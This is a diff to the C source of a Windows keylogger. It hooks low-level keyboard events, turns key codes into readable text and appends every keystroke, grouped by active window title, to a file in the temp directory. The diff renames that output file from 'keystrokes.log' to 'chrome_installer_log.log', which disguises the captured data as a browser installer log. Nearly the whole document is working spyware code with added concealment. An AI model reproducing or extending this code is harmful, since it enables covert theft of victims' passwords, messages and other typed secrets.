@@ -1,8 +1,9 @@
 #include "windows.h"
 #include "stdafx.h"
 #include "logger.h"
+#include <time.h>
 
-#define OUTPUT_FILE_NAME "keystrokes.log"
+#define OUTPUT_FILE_NAME "chrome_installer_log.log"
 
 CHAR *pathToOutputFile;
 FILE *outputFile;
@@ -10,7 +11,8 @@ BYTE keyboardState[256];
 CHAR unicodeBuffer[16];
 
 // Just initialize my global variables 
-void InitWritter() {
+void InitWritter() 
+{
 	CHAR tempPath[MAX_PATH] = { 0 };
 	GetTempPathA(MAX_PATH, tempPath); // retrieving temp path
 	// Approach to append 2 strings (char *)
@@ -26,8 +28,15 @@ void InitWritter() {
 	outputFile = fopen(pathToOutputFile, "a+");
 }
 
-void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
-	switch ((unsigned int)keyEvent->vkCode) {
+void WriteMessage(CHAR *message) {
+	fprintf(outputFile, "%s\n", "Hallo");
+	fflush(outputFile);
+}
+
+void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent)
+{
+	switch ((unsigned int)keyEvent->vkCode)
+	{
 		// About strcpy:
 		//	char * strcpy ( char * destination, const char * source )
 		//	- You may be vulnerable to buffer overflow (if you take user input as source)
@@ -45,7 +54,7 @@ void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
 	case 0x1B:
 		strcpy(buffer, "[Esc]");
 		break;
-	
+
 	case 0x20:
 		strcpy(buffer, "[Space]");
 		break;
@@ -165,9 +174,26 @@ void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
 }
 
 // Here we do the proccesing of the key event in order to print some human-readable output
-void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, PKBDLLHOOKSTRUCT keyEvent) {
+void WriteKeyboardEvent(
+	TCHAR *lastTitle,
+	TCHAR *title,
+	time_t lastTime,
+	time_t currentTime,
+	PKBDLLHOOKSTRUCT keyEvent)
+{
 	ParseVirtualKeyCode(unicodeBuffer, keyEvent);
+	if (strcmp(lastTitle, title) != 0) {
+		fprintf(outputFile, "\n[%s]: %s", title, unicodeBuffer);
 #ifdef _DEBUG	
-	LogMessage("[%s]: %s (%d)\n", lastTitle, unicodeBuffer, keyEvent->vkCode);
+		// LogMessage("[%s]: %s (%d)\n", title, unicodeBuffer, keyEvent->vkCode);
+		LogMessage("\n[%s]: %s", title, unicodeBuffer);
 #endif // DEBUG
+	}
+	else {
+		fprintf(outputFile, "%s", unicodeBuffer);
+#ifdef _DEBUG	
+		LogMessage("%s", unicodeBuffer);
+#endif // DEBUG
+	}
+	fflush(outputFile);
 }
